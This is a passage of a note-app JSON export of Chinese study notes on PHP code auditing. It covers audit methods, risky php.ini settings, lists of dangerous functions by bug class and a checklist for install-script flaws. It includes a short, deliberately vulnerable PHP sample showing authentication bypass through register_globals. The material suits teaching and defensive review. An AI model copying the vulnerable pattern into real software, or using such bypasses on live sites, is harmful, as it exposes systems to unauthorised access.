","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926114629-h5e9bj1"},"Children":[{"ID":"20240926114629-wdvf5st","Type":"NodeParagraph","Properties":{"id":"20240926114629-wdvf5st","updated":"20240926114633"},"Children":[{"Type":"NodeText","Data":"查看关键文件代码"}]}]},{"ID":"20240926114633-1atoykn","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926114633-1atoykn"},"Children":[{"ID":"20240926114633-yi65uep","Type":"NodeParagraph","Properties":{"id":"20240926114633-yi65uep","updated":"20240926114637"},"Children":[{"Type":"NodeText","Data":"查看配置文件"}]}]},{"ID":"20240926114637-upwcz85","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926114637-upwcz85"},"Children":[{"ID":"20240926114637-njrk5jm","Type":"NodeParagraph","Properties":{"id":"20240926114637-njrk5jm","updated":"20240926114644"},"Children":[{"Type":"NodeText","Data":"读首页文件"}]}]},{"ID":"20240926114644-d7qc1v6","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926114644-d7qc1v6"},"Children":[{"ID":"20240926114644-nbzaby1","Type":"NodeParagraph","Properties":{"id":"20240926114644-nbzaby1","updated":"20240926114656"},"Children":[{"Type":"NodeText","Data":"根据入口文件，对个功能进行审计"}]}]}]},{"ID":"20240925095436-c4s5pro","Type":"NodeParagraph","Properties":{"id":"20240925095436-c4s5pro","updated":"20240925095442"},"Children":[{"Type":"NodeText","Data":"优缺点"}]},{"ID":"20240925095443-p1mx8f9","Type":"NodeList","ListData":{},"Properties":{"id":"20240925095443-p1mx8f9"},"Children":[{"ID":"20240925095443-cxniads","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925095443-cxniads"},"Children":[{"ID":"20240925095443-zheszbs","Type":"NodeParagraph","Properties":{"id":"20240925095443-zheszbs","updated":"20240925095511"},"Children":[{"Type":"NodeText","Data":"了解详细结构目录（模块、插件、配置、核心文件），挖掘安全"}]}]},{"ID":"20240925095514-xbgur5p","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925095514-xbgur5p"},"Children":[{"ID":"20240925095514-p1xke4f","Type":"NodeParagraph","Properties":{"id":"20240925095514-p1xke4f","updated":"20240925095525"},"Children":[{"Type":"NodeText","Data":"内容太大不适用"}]}]}]}]},{"ID":"20240925095525-rbd91pp","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925095525-rbd91pp","updated":"20240926114830"},"Children":[{"ID":"20240925095525-u0i870n","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240925095525-u0i870n","updated":"20240926114724"},"Children":[{"Type":"NodeText","Data":"敏感函数参数回溯"}]},{"ID":"20240925095535-58l9qjd","Type":"NodeParagraph","Properties":{"id":"20240925095535-58l9qjd","updated":"20240925095616"},"Children":[{"Type":"NodeText","Data":"根据敏感函数检索-敏感函数回溯（看函数怎么生成定义的，怎么调用的）"}]},{"ID":"20240925095618-wcl96j8","Type":"NodeParagraph","Properties":{"id":"20240925095618-wcl96j8","updated":"20240925095624"},"Children":[{"Type":"NodeText","Data":"优缺点"}]},{"ID":"20240925095628-nkc4dxw","Type":"NodeList","ListData":{},"Properties":{"id":"20240925095628-nkc4dxw"},"Children":[{"ID":"20240925095627-ev2k695","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925095627-ev2k695"},"Children":[{"ID":"20240925095627-qgv43rw","Type":"NodeParagraph","Properties":{"id":"20240925095627-qgv43rw","updated":"20240925161241"},"Children":[{"Type":"NodeText","Data":"速度快、挖掘效率高"}]}]},{"ID":"20240925161241-jlhvgra","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925161241-jlhvgra"},"Children":[{"ID":"20240925161241-kbua6wk","Type":"NodeParagraph","Properties":{"id":"20240925161241-kbua6wk","updated":"20240925161306"},"Children":[{"Type":"NodeText","Data":"回溯时间长、逻辑漏洞无法挖掘（不够了解网站结构）"}]}]}]},{"ID":"20240926114735-2598qev","Type":"NodeParagraph","Properties":{"id":"20240926114735-2598qev","updated":"20240926114744"},"Children":[{"Type":"NodeText","Data":"使用自动工具检索"}]},{"ID":"20240926114807-zkximqy","Type":"NodeList","ListData":{},"Properties":{"id":"20240926114807-zkximqy","updated":"20240926114830"},"Children":[{"ID":"20240926114810-g55iru1","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926114810-g55iru1","updated":"20240926114830"},"Children":[{"ID":"20240926114810-0l1mbc5","Type":"NodeParagraph","Properties":{"id":"20240926114810-0l1mbc5","updated":"20240926114830"},"Children":[{"Type":"NodeText","Data":"Seay源代码审计软件，主要是利用正则匹配一些高危函数、关键函数以及敏感关键字。然后，就可以分析判断敏感函数的上下文，追踪参数源头。尝试控制可控的参数变量"}]}]}]}]},{"ID":"20240925161621-6j5acgq","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"fold":"0","id":"20240925161621-6j5acgq","updated":"20240926114904"},"Children":[{"ID":"20240925161621-m0ygfl0","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240925161621-m0ygfl0"},"Children":[{"Type":"NodeText","Data":"定向功能分析方法"}]},{"ID":"20240925161630-dee5onz","Type":"NodeList","ListData":{},"Properties":{"id":"20240925161630-dee5onz","updated":"20240926114904"},"Children":[{"ID":"20240925161628-fqdol9a","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925161628-fqdol9a","updated":"20240926114904"},"Children":[{"ID":"20240925161628-uquznvk","Type":"NodeParagraph","Properties":{"id":"20240925161628-uquznvk","updated":"20240925161716"},"Children":[{"Type":"NodeText","Data":"关注：程序功能（登录、注销、注册、留言板、上传功能、跟新资料功能、文件管理、数据库备份功能、逻辑）初始安装"}]},{"ID":"20240926114904-uvv2q1r","Type":"NodeParagraph","Properties":{"id":"20240926114904-uvv2q1r","updated":"20240926114904"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240926114904-b2p1hfu.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]},{"ID":"20240925161730-uy23ino","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925161730-uy23ino"},"Children":[{"ID":"20240925161730-dlk3km5","Type":"NodeParagraph","Properties":{"id":"20240925161730-dlk3km5","updated":"20240925161752"},"Children":[{"Type":"NodeText","Data":"了解结构和代码量-通读、回溯、自动"}]}]},{"ID":"20240925161755-6ubxrmo","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925161755-6ubxrmo"},"Children":[{"ID":"20240925161755-if0aoxr","Type":"NodeParagraph","Properties":{"id":"20240925161755-if0aoxr","updated":"20240925161803"},"Children":[{"Type":"NodeText","Data":"根据功能区定向审计"}]}]},{"ID":"20240925161804-3lzsvcv","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925161804-3lzsvcv"},"Children":[{"ID":"20240925161804-q86kbjz","Type":"NodeParagraph","Properties":{"id":"20240925161804-q86kbjz","updated":"20240925161811"},"Children":[{"Type":"NodeText","Data":"自动工具的敏感函数回溯"}]}]}]}]}]}]}]},{"ID":"20240925161816-05dt33v","Type":"NodeParagraph","Properties":{"id":"20240925161816-05dt33v","updated":"20240925161817"}},{"ID":"20240925103510-t8c8wj7","Type":"NodeHeading","HeadingLevel":2,"Properties":{"fold":"1","id":"20240925103510-t8c8wj7","updated":"20240925103527"},"Children":[{"Type":"NodeText","Data":"php几个重要配置项"}]},{"ID":"20240925104229-gwyt4jx","Type":"NodeList","ListData":{"Typ":1},"Properties":{"fold":"1","heading-fold":"1","id":"20240925104229-gwyt4jx","updated":"20240925185905"},"Children":[{"ID":"20240925104229-5mddsmz","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"MS4=","Num":1},"Properties":{"id":"20240925104229-5mddsmz","updated":"20240926135021"},"Children":[{"ID":"20240925104224-vb2pcrn","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20240925104224-vb2pcrn","updated":"20240925104249"},"Children":[{"Type":"NodeText","Data":"变量覆盖漏洞的配置项（在5.2.17环境下）"}]},{"ID":"20240925104258-zx5cb8y","Type":"NodeParagraph","Properties":{"id":"20240925104258-zx5cb8y","updated":"20240926134926"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background7);"},"TextMarkType":"text","TextMarkTextContent":"register_globals=off"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background7);\"}"}]},{"ID":"20240925104318-kczb3hp","Type":"NodeList","ListData":{},"Properties":{"id":"20240925104318-kczb3hp","updated":"20240926115000"},"Children":[{"ID":"20240925104619-pn2h9fb","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925104619-pn2h9fb","updated":"20240926115000"},"Children":[{"ID":"20240925104619-rziyawt","Type":"NodeParagraph","Properties":{"id":"20240925104619-rziyawt","updated":"20240926115000"},"Children":[{"Type":"NodeText","Data":"作用：将全局变量"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background10);"},"TextMarkType":"text","TextMarkTextContent":"自动注册"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background10);\"}"}]}]}]},{"ID":"20240925104332-wenwf3e","Type":"NodeList","ListData":{},"Properties":{"id":"20240925104332-wenwf3e","updated":"20240926135021"},"Children":[{"ID":"20240925104621-d3r2i44","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925104621-d3r2i44","updated":"20240925104621"},"Children":[{"ID":"20240925104621-l0tza2v","Type":"NodeParagraph","Properties":{"id":"20240925104621-l0tza2v","updated":"20240926115018"},"Children":[{"Type":"NodeText","Data":"PS：在php5.3.0以后版本被弃用，5.4以后被完全移除，5.2.0默认开启"}]}]},{"ID":"20240926135016-9jfycyv","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926135016-9jfycyv","updated":"20240926135021"},"Children":[{"ID":"20240926135016-j4mufcs","Type":"NodeParagraph","Properties":{"id":"20240926135016-j4mufcs","updated":"20240926135021"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color8);"},"TextMarkType":"text","TextMarkTextContent":"register_globals=on时，可通过[URL]?authorized=1，定义\n该变量值所以任何人都可以绕过身份验证"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color8);\"}"}]}]}]},{"ID":"20240925104614-zc6se3w","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20240925104614-zc6se3w","updated":"20240926135014"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cGhw"},{"Type":"NodeCodeBlockCode","Data":"//$a=ipconfig\n//$$a---\u003e$ipconfig\n\n\u003c?php\n// 变量覆盖漏洞--配置项：register_globals = off ---\u003eon时存在漏洞\n$username=$_GET['username'];\n$password=$_GET['password']; // 当用户合法的时候，赋值\nif(($username===\"admin\") \u0026\u0026($password===\"admin123\")){\n$authorized = true; //\nif($authorized){\necho 'success';\n}\n}\necho $authorized; //未定义GET方式，但依旧能获取\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]}]},{"ID":"20240925104254-3vi1fjy","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"Mi4=","Num":2},"Properties":{"id":"20240925104254-3vi1fjy","updated":"20240926135322"},"Children":[{"ID":"20240925104254-sgl73bc","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20240925104254-sgl73bc","updated":"20240925162251"},"Children":[{"Type":"NodeText","Data":"禁用命令执行的"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background7);"},"TextMarkType":"text","TextMarkTextContent":"safe_mode=off"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background7);\"}"},{"Type":"NodeText","Data":"（5.2.17）"}]},{"ID":"20240925104645-d9x24l3","Type":"NodeList","ListData":{},"Properties":{"id":"20240925104645-d9x24l3","updated":"20240926135322"},"Children":[{"ID":"20240925104650-qldzg5y","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925104650-qldzg5y","updated":"20240925104650"},"Children":[{"ID":"20240925104650-9n1qhok","Type":"NodeParagraph","Properties":{"id":"20240925104650-9n1qhok","updated":"20240925104719"},"Children":[{"Type":"NodeText","Data":"作用：禁用php中危险的内置函数，比如system()/exec()"}]}]},{"ID":"20240925165620-r8mf7lo","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925165620-r8mf7lo"},"Children":[{"ID":"20240925165620-a4032t7","Type":"NodeParagraph","Properties":{"id":"20240925165620-a4032t7","updated":"20240926135055"},"Children":[{"Type":"NodeText","Data":"版本：5.3.0开始废弃、5.4.0被移除"}]}]},{"ID":"20240925165641-uq2wdwx","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925165641-uq2wdwx"},"Children":[{"ID":"20240925165641-oq0nfp6","Type":"NodeParagraph","Properties":{"id":"20240925165641-oq0nfp6","updated":"20240925165647"},"Children":[{"Type":"NodeText","Data":"PS：为off时可使用内置函数，为on时函数被禁用"}]}]},{"ID":"20240926135113-j96tiri","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926135113-j96tiri"},"Children":[{"ID":"20240926135131-vtf04wi","Type":"NodeParagraph","Properties":{"id":"20240926135131-vtf04wi","updated":"20240926135131"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240926135131-ticigej.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]},{"ID":"20240926135212-8ipoptl","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926135212-8ipoptl","updated":"20240926135322"},"Children":[{"ID":"20240926135212-cw066s4","Type":"NodeParagraph","Properties":{"id":"20240926135212-cw066s4","updated":"20240926135218"},"Children":[{"Type":"NodeText","Data":"相关配置还有"}]},{"ID":"20240926135218-5aspr0a","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20240926135218-5aspr0a","updated":"20240926135322"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cGhw"},{"Type":"NodeCodeBlockCode","Data":"safe_mode_exec_dir\ndisable_classes\ndisable_functions=fopen\nunlink\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]}]}]}]},{"ID":"20240925104256-dozwewb","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"My4=","Num":3},"Properties":{"id":"20240925104256-dozwewb","updated":"20240926135637"},"Children":[{"ID":"20240925165657-iz5r8p0","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20240925165657-iz5r8p0","updated":"20240925165705"},"Children":[{"Type":"NodeText","Data":"php错误回显的配置："},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background7);"},"TextMarkType":"text","TextMarkTextContent":"display_error=on"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background7);\"}"},{"Type":"NodeText","Data":" 时存在错误回显，off不存在"}]},{"ID":"20240925165657-0poiaxz","Type":"NodeList","ListData":{},"Properties":{"id":"20240925165657-0poiaxz","updated":"20240926135637"},"Children":[{"ID":"20240926135345-29go2qh","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926135345-29go2qh"},"Children":[{"ID":"20240926135345-2jt53ap","Type":"NodeParagraph","Properties":{"id":"20240926135345-2jt53ap","updated":"20240926135449"},"Children":[{"Type":"NodeText","Data":"未关闭则会暴露服务器的目录信息，还增加了SQL注入的风险"}]}]}]}]},{"ID":"20240925165722-zmn7r3m","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"NC4=","Num":4},"Properties":{"id":"20240925165722-zmn7r3m","updated":"20240925185905"},"Children":[{"ID":"20240925165722-a0dzhfd","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20240925165722-a0dzhfd","updated":"20240925165723"},"Children":[{"Type":"NodeText","Data":"其他日志相关的"}]},{"ID":"20240925170623-ysjr3ut","Type":"NodeParagraph","Properties":{"id":"20240925170623-ysjr3ut","updated":"20240925170705"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background7);"},"TextMarkType":"text","TextMarkTextContent":"log_errors=On"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background7);\"}"},{"Type":"NodeText","Data":"将错误写入到日志里"}]},{"ID":"20240925170736-012gt8p","Type":"NodeParagraph","Properties":{"id":"20240925170736-012gt8p","updated":"20240925171012"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background7);"},"TextMarkType":"text","TextMarkTextContent":"error_log="},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background7);\"}"},{"Type":"NodeText","Data":"错误日志路径存放"}]},{"ID":"20240925170942-gi5i1s6","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20240925170942-gi5i1s6","updated":"20240925170943"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cGhw"},{"Type":"NodeCodeBlockCode","Data":"max_input_vars=3000\nerror_log=C:/phpstudy_pro/Extensions/php/php5.3.29nts.log #日志绝对路径和\n最大条数\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20240925170853-767r0kv","Type":"NodeParagraph","Properties":{"id":"20240925170853-767r0kv","updated":"20240925171003"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background7);"},"TextMarkType":"text","TextMarkTextContent":"error_reporting"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background7);\"}"}]},{"ID":"20240925165751-i3cd0vd","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20240925165751-i3cd0vd","updated":"20240925185826"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cGhw"},{"Type":"NodeCodeBlockCode","Data":"; Common Values:\n; E_ALL \u0026 ~E_NOTICE (Show all errors, except for notices and coding standards\nwarnings.)\n; E_ALL \u0026 ~E_NOTICE | E_STRICT (Show all errors, except for notices)\n; E_COMPILE_ERROR|E_RECOVERABLE_ERROR|E_ERROR|E_CORE_ERROR (Show only errors)\n; E_ALL | E_STRICT (Show all errors, warnings and notices including coding\nstandards.)\n; Default Value: E_ALL \u0026 ~E_NOTICE\n; Development Value: E_ALL | E_STRICT\n; Production Value: E_ALL \u0026 ~E_DEPRECATED\n; http://php.net/error-reporting\nerror_reporting=E_ALL \u0026 ~E_NOTICE #日志等级配置\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20240925185853-j9gzqua","Type":"NodeParagraph","Properties":{"id":"20240925185853-j9gzqua","updated":"20240925185905"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background7);"},"TextMarkType":"text","TextMarkTextContent":"access.log"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background7);\"}"}]}]}]},{"ID":"20240925190013-36e94s7","Type":"NodeHeading","HeadingLevel":2,"Properties":{"fold":"1","id":"20240925190013-36e94s7","updated":"20240925190019"},"Children":[{"Type":"NodeText","Data":"php危险函数"}]},{"ID":"20240926135727-334bflt","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240926135727-334bflt","updated":"20240926135727"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240926135727-3z59z6k.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240925190045-syhm6l4","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20240925190045-syhm6l4","updated":"20240925190045"},"Children":[{"Type":"NodeText","Data":"SQL注入相关"}]},{"ID":"20240925190114-wnvupg4","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240925190114-wnvupg4","updated":"20240926135815"},"Children":[{"Type":"NodeText","Data":"mysql_query mysqli_query  mysqli::query  PDO::query"}]},{"ID":"20240925190045-l5wwsbn","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20240925190045-l5wwsbn","updated":"20240925190117"},"Children":[{"Type":"NodeText","Data":"命令执行"}]},{"ID":"20240925190134-gbiet8o","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240925190134-gbiet8o","updated":"20240926135856"},"Children":[{"Type":"NodeText","Data":"system()  exec() shell_exec() passthrU() ponen() `` 回调函数"}]},{"ID":"20240925190155-f4mis63","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240925190155-f4mis63","updated":"20240925190156"},"Children":[{"Type":"NodeText","Data":"（call_user_func()\\call_user_func_array()\\create_function()等）"}]},{"ID":"20240925190045-jurky88","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20240925190045-jurky88","updated":"20240925190121"},"Children":[{"Type":"NodeText","Data":"file操作"}]},{"ID":"20240925190143-cs3e5wz","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240925190143-cs3e5wz","updated":"20240925190159"},"Children":[{"Type":"NodeText","Data":"open close write fread file_put_contests file_get_contents unlink 等"}]},{"ID":"20240925190045-ow18gt8","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20240925190045-ow18gt8","updated":"20240925190045"},"Children":[{"Type":"NodeText","Data":"文件包含"}]},{"ID":"20240925190147-z4e9xtd","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240925190147-z4e9xtd","updated":"20240925190147"},"Children":[{"Type":"NodeText","Data":"include include_once require require_once"}]},{"ID":"20240925190045-afsnp6h","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20240925190045-afsnp6h","updated":"20240925190045"},"Children":[{"Type":"NodeText","Data":"XSS漏洞"}]},{"ID":"20240925190206-dbfppeq","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240925190206-dbfppeq","updated":"20240925190206"},"Children":[{"Type":"NodeText","Data":"echo print print_r() var_dump()"}]},{"ID":"20240925190206-3l4nsob","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20240925190206-3l4nsob","updated":"20240925190223"},"Children":[{"Type":"NodeText","Data":"反序列化"}]},{"ID":"20240925190223-56qpwk3","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240925190223-56qpwk3","updated":"20240925190224"},"Children":[{"Type":"NodeText","Data":"unserialize serialize 魔术函数"}]},{"ID":"20240925190045-4zv4u8e","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20240925190045-4zv4u8e","updated":"20240925190132"}},{"ID":"20240925141251-vxpx2vy","Type":"NodeHeading","HeadingLevel":1,"Properties":{"id":"20240925141251-vxpx2vy","updated":"20240925141308"},"Children":[{"Type":"NodeText","Data":"漏洞"}]},{"ID":"20240925141314-nsy90jy","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20240925141314-nsy90jy","updated":"20240925141349"},"Children":[{"Type":"NodeText","Data":"安装漏洞（install）审计"}]},{"ID":"20240925141351-0roj6ut","Type":"NodeList","ListData":{},"Properties":{"id":"20240925141351-0roj6ut","updated":"20240926153657"},"Children":[{"ID":"20240926153657-o13o48f","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"fold":"1","id":"20240926153657-o13o48f","updated":"20240926153657"},"Children":[{"ID":"20240926153657-ccdcg9j","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240926153657-ccdcg9j","updated":"20240926153657"},"Children":[{"Type":"NodeText","Data":"一般php程序的一个初始安装的功能，存在以下漏洞"}]},{"ID":"20240926153728-3o854t2","Type":"NodeBlockquote","Properties":{"id":"20240926153728-3o854t2","updated":"20240926153729"},"Children":[{"ID":"20240926153729-3ub64fp","Type":"NodeParagraph","Properties":{"id":"20240926153729-3ub64fp","updated":"20240926153729"},"Children":[{"Type":"NodeText","Data":"1.无验证功能，任意重装覆盖"}]},{"ID":"20240926153729-c2t9ei5","Type":"NodeParagraph","Properties":{"id":"20240926153729-c2t9ei5","updated":"20240926153729"},"Children":[{"Type":"NodeText","Data":"2.$_GET['step']跳过限制步骤"}]},{"ID":"20240926153729-3fajtj0","Type":"NodeParagraph","Properties":{"id":"20240926153729-3fajtj0","updated":"20240926153729"},"Children":[{"Type":"NodeText","Data":"3.变量覆盖导致重装"}]},{"ID":"20240926153729-h7qzo3p","Type":"NodeParagraph","Properties":{"id":"20240926153729-h7qzo3p","updated":"20240926153729"},"Children":[{"Type":"NodeText","Data":"4.判断lock后跳转无exit"}]},{"ID":"20240926153729-jlwqksu","Type":"NodeParagraph","Properties":{"id":"20240926153729-jlwqksu","updated":"20240926153729"},"Children":[{"Type":"NodeText","Data":"5.解析install.php.bak漏洞"}]},{"ID":"20240926153729-c9cy5dd","Type":"NodeParagraph","Properties":{"id":"20240926153729-c9cy5dd","updated":"20240926153729"},"Children":[{"Type":"NodeText","Data":"6.其他特定功能绕过漏洞"}]},{"ID":"20240926153729-j7xhb86","Type":"NodeParagraph","Properties":{"id":"20240926153729-j7xhb86","updated":"20240926153729"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240926153649-gizx5jt.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]}]}]},{"ID":"20240926153340-c4kci1u","Type":"NodeList","ListData":{},"Properties":{"id":"20240926153340-c4kci1u","updated":"20240926153707"},"Children":[{"ID":"20240926153741-xv55chj","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"fold":"1","id":"20240926153741-xv55chj","updated":"20240926153751"},"Children":[{"ID":"20240926153741-zkctll4","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240926153741-zkctll4","updated":"20240926153751"},"Children":[{"Type":"NodeText","Data":"审计思路"}]},{"ID":"20240926153753-ln4mlq6","Type":"NodeList","ListData":{},"Properties":{"id":"20240926153753-ln4mlq6","updated":"20240926154619"},"Children":[{"ID":"20240926153752-zrmligm","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926153752-zrmligm"},"Children":[{"ID":"20240926153752-3321teb","Type":"NodeParagraph","Properties":{"id":"20240926153752-3321teb","updated":"20240926153810"},"Children":[{"Type":"NodeText","Data":"定向功能分析，直接找安装问题找漏洞"}]}]},{"ID":"20240926153814-id9vcuh","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926153814-id9vcuh","updated":"20240926154619"},"Children":[{"ID":"20240926153814-twqj3gx","Type":"NodeParagraph","Properties":{"id":"20240926153814-twqj3gx","updated":"20240926153843"},"Children":[{"Type":"NodeText","Data":"判定lock后面有没有exit，如果无exit，看代码重装部分有什么漏洞"}]},{"ID":"20240926154619-lzq2mtv","Type":"NodeParagraph","Properties":{"id":"20240926154619-lzq2mtv","updated":"20240926154619"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240926154619-k863q10.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]}]}]},{"ID":"20240926153707-du3423b","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Propertie